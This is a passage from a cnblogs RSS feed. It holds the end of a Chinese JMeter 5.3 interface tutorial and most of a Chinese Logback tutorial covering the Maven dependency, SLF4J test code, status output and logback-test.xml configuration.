&lt;p&gt;复制元件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;粘贴元件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;展开目录树&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;收起目录树&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;禁用或启用元件，如果是父节点，那么其子节点也会一同被禁用&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;启动运行测试计划&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;启动运行测试计划，&lt;strong&gt;忽略定时器&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;停止，直接把所有线程停掉，类似于“杀进程”&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;&lt;strong&gt;关闭，等当前线程执行完成后结束线程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;“停止”或“关闭”在点击后会弹出相同的对话框，从实际效果来看，停止比关闭更快：&lt;/p&gt;
&lt;center&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1629545/202011/1629545-20201102205512243-1178959703.png&quot;/&gt;&lt;/center&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;清除响应数据&lt;/strong&gt;，比如查看结果树，聚合报告，但不能清除日志控制台&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;清除全部数据&lt;/strong&gt;，包括日志&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;查找，点击后弹出查找对话框，支持正则：&lt;/p&gt;
&lt;center&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1629545/202011/1629545-20201102205512431-345387710.png&quot;/&gt;&lt;/center&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;清除查找&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;函数助手，在做参数化时会用到，点击后弹出对话框：&lt;/p&gt;
&lt;center&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1629545/202011/1629545-20201102205512615-2082608865.png&quot;/&gt;&lt;/center&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;帮助文档&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;执行耗时，精度为秒&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;错误日志个数，点击后会打开日志控制台&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;正在运行线程数 / 总线程数&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;运行状态，启动运行测试计划后变绿色&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;菜单栏和工具栏有些功能是重叠的，本小节挑选菜单栏特有的功能进行介绍。&lt;/p&gt;
&lt;h2 id=&quot;file&quot;&gt;File&lt;/h2&gt;
&lt;center&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1629545/202011/1629545-20201102205512812-409943141.png&quot;/&gt;&lt;/center&gt;
&lt;h2 id=&quot;edit&quot;&gt;Edit&lt;/h2&gt;
&lt;p&gt;选中测试计划、线程组或其他元件，Edit 菜单略有不同，这里以&lt;strong&gt;线程组&lt;/strong&gt;为例进行介绍，其他相差不大：&lt;/p&gt;
&lt;center&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1629545/202011/1629545-20201102205513011-2042206061.png&quot;/&gt;&lt;/center&gt;
&lt;h2 id=&quot;search&quot;&gt;Search&lt;/h2&gt;
&lt;center&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1629545/202011/1629545-20201102205513219-903197173.png&quot;/&gt;&lt;/center&gt;
&lt;h2 id=&quot;run&quot;&gt;Run&lt;/h2&gt;
&lt;center&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1629545/202011/1629545-20201102205513431-1757193319.png&quot;/&gt;&lt;/center&gt;
&lt;h2 id=&quot;options&quot;&gt;Options&lt;/h2&gt;
&lt;center&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1629545/202011/1629545-20201102205513733-1239492667.png&quot;/&gt;&lt;/center&gt;

&lt;center&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1629545/202011/1629545-20201102205514020-1708451272.png&quot;/&gt;&lt;/center&gt;

&lt;p&gt;在打开了 JMeter 的图形界面以后，可以按照以下步骤来使用：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;建立线程组，用线程模拟用户，产生大量负载。&lt;/li&gt;
&lt;li&gt;运行取样器，发起并发请求。&lt;/li&gt;
&lt;li&gt;运行过程中，通过断言验证结果正确性。&lt;/li&gt;
&lt;li&gt;通过监听器记录测试结果。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;如果取样器需要&lt;strong&gt;参数化&lt;/strong&gt;，通过配置元件（CSV、函数、自定义变量）或前置处理器（用户参数）来完成。&lt;/p&gt;
&lt;p&gt;如果需要做&lt;strong&gt;关联&lt;/strong&gt;（关联：从上一条请求中获取数据，在下一条请求中使用），通过后置处理器（如正则表达式提取）来完成。&lt;/p&gt;
&lt;p&gt;如果需要&lt;strong&gt;设置场景&lt;/strong&gt;，比如模拟多少用户，运行多少时间，可以设置线程组编辑项。&lt;/p&gt;
&lt;p&gt;如果需要&lt;strong&gt;同一时刻&lt;/strong&gt;发送请求加压，可以使用定时器。&lt;/p&gt;
&lt;p&gt;如果需要&lt;strong&gt;控制&lt;/strong&gt;业务的执行逻辑，可以使用逻辑控制器。&lt;/p&gt;

&lt;p&gt;本文基于 JMeter 5.3 版本，介绍了 3 个主要界面工作区域。区域 1 是目录树，用于管理元件。区域 2 是编辑区，用于对元件进行配置。区域 3 是工具栏，提供了功能快捷方式。左上角是菜单栏，提供了一些特有功能。最后讲述了 JMeter 的基本使用。&lt;/p&gt;
&lt;p&gt;下一篇《JMeter实战(四) 元件作用域》&lt;/p&gt;
&lt;p&gt;参考资料：《全栈性能测试修炼宝典JMeter实战》&lt;/p&gt;
</description>
<pubDate>Mon, 02 Nov 2020 23:48:00 +0000</pubDate>
<dc:creator>测试老树</dc:creator>
<og:description>界面挺好用的。</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/df888/p/13916455.html</dc:identifier>
</item>
<item>
<title>老板下了死命令，要把日志系统切换到Logback - 沉默王二</title>
<link>http://www.cnblogs.com/qing-gee/p/13917480.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/qing-gee/p/13917480.html</guid>
<description>&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/AXgNnJe8djD901EmhFkWUg&quot;&gt;Log4j&lt;/a&gt; 介绍过了，&lt;a href=&quot;https://mp.weixin.qq.com/s/EhKf1rHWL-QII0f6eo0uVA&quot;&gt;SLF4J&lt;/a&gt; 也介绍过了，那接下来，你懂的，Logback 就要隆重地登场了，毕竟它哥仨有一个爹，那就是巨佬 Ceki Gulcu。&lt;/p&gt;
&lt;p&gt;就在昨天，老板听我说完 Logback 有多牛逼之后，彻底动心了，对我下了死命令，“这么好的日志系统，你还不赶紧点，把它切换到咱的项目当中！”&lt;/p&gt;
&lt;p&gt;我们项目之前用的 Log4j，在我看来，已经足够用了，毕竟是小公司，性能上的要求没那么苛刻。&lt;/p&gt;
&lt;img src=&quot;http://www.itwanger.com/assets/images/2020/11/java-logback-01.png&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;h3 id=&quot;h01logback&quot;&gt;&lt;span&gt;01、Logback 强在哪&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;1）非常自然地实现了 SLF4J，不需要像 Log4j 和 JUL 那样加一个适配层。&lt;/p&gt;
&lt;img src=&quot;http://www.itwanger.com/assets/images/2020/11/java-logback-02.png&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;p&gt;2）Spring Boot 的默认日志框架使用的是 Logback。一旦某款工具库成为了默认选项，那就说明这款工具已经超过了其他竞品。&lt;/p&gt;
&lt;img src=&quot;http://www.itwanger.com/assets/images/2020/11/java-logback-03.png&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;p&gt;注意看下图（证据找到了，来自 &lt;a href=&quot;https://docs.spring.io/spring-boot/docs/current/reference/html/spring-boot-features.html#boot-features-logging&quot;&gt;Spring Boot 官网&lt;/a&gt;）：&lt;/p&gt;
&lt;img src=&quot;http://www.itwanger.com/assets/images/2020/11/java-logback-04.png&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;p&gt;也可以通过源码的形式看得到：&lt;/p&gt;
&lt;img src=&quot;http://www.itwanger.com/assets/images/2020/11/java-logback-05.png&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;p&gt;3）支持自动重新加载配置文件，不需要另外创建扫描线程来监视。&lt;/p&gt;
&lt;p&gt;4）既然是巨佬的新作，那必然在性能上有了很大的提升，不然呢？&lt;/p&gt;
&lt;h3 id=&quot;h02logback&quot;&gt;&lt;span&gt;02、Logback 使用示例&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;第一步&lt;/strong&gt;，在 pom.xml 文件中添加 Logback 的依赖：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;xml language-xml hljs&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;ch.qos.logback&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;logback-classic&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;1.2.3&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Maven 会自动导入另外两个依赖：&lt;/p&gt;
&lt;img src=&quot;http://www.itwanger.com/assets/images/2020/11/java-logback-07.png&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;p&gt;logback-core 是 Logback 的核心，logback-classic 是 SLF4J 的实现。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二步&lt;/strong&gt;，来个最简单的测试用例：&lt;/p&gt;
&lt;pre readability=&quot;4.5&quot;&gt;
&lt;code class=&quot;java language-java hljs&quot; readability=&quot;3&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.slf4j.Logger;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.slf4j.LoggerFactory;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Test&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; Logger logger = LoggerFactory.getLogger(Test.class);&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(String[] args)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;logger.debug(&lt;span class=&quot;hljs-string&quot;&gt;&quot;logback&quot;&lt;/span&gt;);&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Logger 和 LoggerFactory 都来自 SLF4J，所以如果项目是从 Log4j + SLF4J 切换到 Logback 的话，此时的代码是零改动的。&lt;/p&gt;
&lt;p&gt;运行 Test 类，可以在控制台看到以下信息：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs css&quot;&gt;12&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:04&lt;/span&gt;&lt;span class=&quot;hljs-selector-pseudo&quot;&gt;:20.149&lt;/span&gt; &lt;span class=&quot;hljs-selector-attr&quot;&gt;[main]&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;DEBUG&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.itwanger&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.Test&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;logback&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在没有配置文件的情况下，一切都是默认的，Logback 的日志信息会输出到控制台。可以通过 StatusPrinter 来打印 Logback 的内部信息：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;java language-java hljs&quot;&gt;LoggerContext lc = (LoggerContext)LoggerFactory.getILoggerFactory();&lt;br/&gt;StatusPrinter.print(lc);&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在 main 方法中添加以上代码后，再次运行 Test 类，可以在控制台看到以下信息：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs vbnet&quot;&gt;&lt;span class=&quot;hljs-number&quot;&gt;12&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;59&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;22.314&lt;/span&gt; [main] DEBUG com.itwanger.Test - logback&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;12&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;59&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;22&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;261&lt;/span&gt; |-INFO &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; ch.qos.logback.classic.LoggerContext[&lt;span class=&quot;hljs-keyword&quot;&gt;default&lt;/span&gt;] - Could &lt;span class=&quot;hljs-keyword&quot;&gt;NOT&lt;/span&gt; find resource [logback-test.xml]&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;12&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;59&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;22&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;262&lt;/span&gt; |-INFO &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; ch.qos.logback.classic.LoggerContext[&lt;span class=&quot;hljs-keyword&quot;&gt;default&lt;/span&gt;] - Could &lt;span class=&quot;hljs-keyword&quot;&gt;NOT&lt;/span&gt; find resource [logback.groovy]&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;12&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;59&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;22&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;262&lt;/span&gt; |-INFO &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; ch.qos.logback.classic.LoggerContext[&lt;span class=&quot;hljs-keyword&quot;&gt;default&lt;/span&gt;] - Could &lt;span class=&quot;hljs-keyword&quot;&gt;NOT&lt;/span&gt; find resource [logback.xml]&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;12&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;59&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;22&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;268&lt;/span&gt; |-INFO &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; ch.qos.logback.classic.BasicConfigurator@&lt;span class=&quot;hljs-number&quot;&gt;5e853265&lt;/span&gt; - Setting up &lt;span class=&quot;hljs-keyword&quot;&gt;default&lt;/span&gt; configuration.&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;也就是说，Logback 会在 classpath 路径下先寻找 logback-test.xml 文件，没有找到的话，寻找 logback.groovy 文件，还没有的话，寻找 logback.xml 文件，都找不到的话，就输出到控制台。&lt;/p&gt;
&lt;p&gt;一般来说，我们会在本地环境中配置 logback-test.xml，在生产环境下配置 logback.xml。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第三步&lt;/strong&gt;，在 resource 目录下增加 logback-test.xml 文件，内容如下所示：&lt;/p&gt;
&lt;pre readability=&quot;4&quot;&gt;
&lt;code class=&quot;xml language-xml hljs&quot; readability=&quot;2&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;configuration&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;debug&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;true&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;appender&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;STDOUT&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;ch.qos.logback.core.ConsoleAppender&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;encoder&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;%d{HH:mm:ss.SSS} %relative [%thread] %-5level %logger{36} - %msg%n&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;encoder&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;appender&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;p&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;level&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;debug&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;appender-ref&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;ref&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;STDOUT&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;root&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;configuration&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Logback 的配置文件非常灵活，最基本的结构为 &lt;code&gt;&amp;lt;configuration&amp;gt;&lt;/code&gt; 元素，包含 0 或多个 &lt;code&gt;&amp;lt;appender&amp;gt;&lt;/code&gt; 元素，其后跟 0 或多个 &lt;code&gt;&amp;lt;logger&amp;gt;&lt;/code&gt; 元素，其后再跟最多只能存在一个的 &lt;code&gt;&amp;lt;root&amp;gt;&lt;/code&gt; 元素。&lt;/p&gt;
&lt;img src=&quot;http://www.itwanger.com/assets/images/2020/11/java-logback-08.png&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;p&gt;&lt;strong&gt;1）配置 appender&lt;/strong&gt;，也就是配置日志的输出目的地，通过 name 属性指定名字，通过 class 属性指定目的地：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;ch.qos.logback.core.ConsoleAppender：输出到控制台。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;ch.qos.logback.core.FileAppender：输出到文件。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;ch.qos.logback.core.rolling.RollingFileAppender：文件大小超过阈值时产生一个新文件。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;除了输出到本地，还可以通过 SocketAppender 和 SSLSocketAppender 输出到远程设备，通过 SMTPAppender 输出到邮件。甚至可以通过 DBAppender 输出到数据库中。&lt;/p&gt;
&lt;p&gt;encoder 负责把日志信息转换成字节数组，并且把字节数组写到输出流。&lt;/p&gt;
&lt;p&gt;pattern 用来指定日志的输出格式：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;%d&lt;/code&gt;：输出的时间格式。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%thread&lt;/code&gt;：日志的线程名。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%-5level&lt;/code&gt;：日志的输出级别，填充到 5 个字符。比如说 info 只有 4 个字符，就填充一个空格，这样日志信息就对齐了。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;反例（没有指定 -5 的情况）：&lt;/p&gt;
&lt;img src=&quot;http://www.itwanger.com/assets/images/2020/11/java-logback-09.png&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;%logger{length}&lt;/code&gt;：logger 的名称，length 用来缩短名称。没有指定表示完整输出；0 表示只输出 logger 最右边点号之后的字符串；其他数字表示输出小数点最后边点号之前的字符数量。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%msg&lt;/code&gt;：日志的具体信息。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%n&lt;/code&gt;：换行符。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%relative&lt;/code&gt;：输出从程序启动到创建日志记录的时间，单位为毫秒。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;2）配置 root&lt;/strong&gt;，它只支持一个属性——level，值可以为：TRACE、DEBUG、INFO、WARN、ERROR、ALL、OFF。&lt;/p&gt;
&lt;p&gt;appender-ref 用来指定具体的 appender。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3）查看内部状态信息&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;可以在代码中通过 StatusPrinter 来打印 Logback 内部状态信息，也可以通过在 configuration 上开启 debug 来打印内部状态信息。&lt;/p&gt;
&lt;p&gt;重新运行 Test 类，可以在控制台看到以下信息：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs vbnet&quot;&gt;&lt;span class=&quot;hljs-number&quot;&gt;13&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;54&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;54&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;718&lt;/span&gt; |-INFO &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; ch.qos.logback.classic.LoggerContext[&lt;span class=&quot;hljs-keyword&quot;&gt;default&lt;/span&gt;] - Found resource [logback-test.xml] at [file:/Users/maweiqing/Documents/GitHub/JavaPointNew/codes/logbackDemo/target/classes/logback-test.xml]&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;13&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;54&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;54&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;826&lt;/span&gt; |-INFO &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; ch.qos.logback.core.joran.action.AppenderAction - About &lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt; instantiate appender &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; type [ch.qos.logback.core.ConsoleAppender]&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;13&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;54&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;54&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;828&lt;/span&gt; |-INFO &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; ch.qos.logback.core.joran.action.AppenderAction - Naming appender &lt;span class=&quot;hljs-keyword&quot;&gt;as&lt;/span&gt; [STDOUT]&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;13&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;54&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;54&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;833&lt;/span&gt; |-INFO &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; ch.qos.logback.core.joran.action.NestedComplexPropertyIA - Assuming &lt;span class=&quot;hljs-keyword&quot;&gt;default&lt;/span&gt; type [ch.qos.logback.classic.encoder.PatternLayoutEncoder] &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; [encoder] &lt;span class=&quot;hljs-keyword&quot;&gt;property&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;13&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;54&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;54&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;850&lt;/span&gt; |-INFO &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; ch.qos.logback.classic.joran.action.RootLoggerAction - Setting level &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; ROOT logger &lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt; DEBUG&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;13&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;54&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;54&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;850&lt;/span&gt; |-INFO &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; ch.qos.logback.core.joran.action.AppenderRefAction - Attaching appender named [STDOUT] &lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt; Logger[ROOT]&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;13&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;54&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;54&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;850&lt;/span&gt; |-INFO &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; ch.qos.logback.classic.joran.action.ConfigurationAction - &lt;span class=&quot;hljs-keyword&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; configuration.&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;13&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;54&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;54&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;851&lt;/span&gt; |-INFO &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; ch.qos.logback.classic.joran.JoranConfigurator@f8c1ddd - Registering current configuration &lt;span 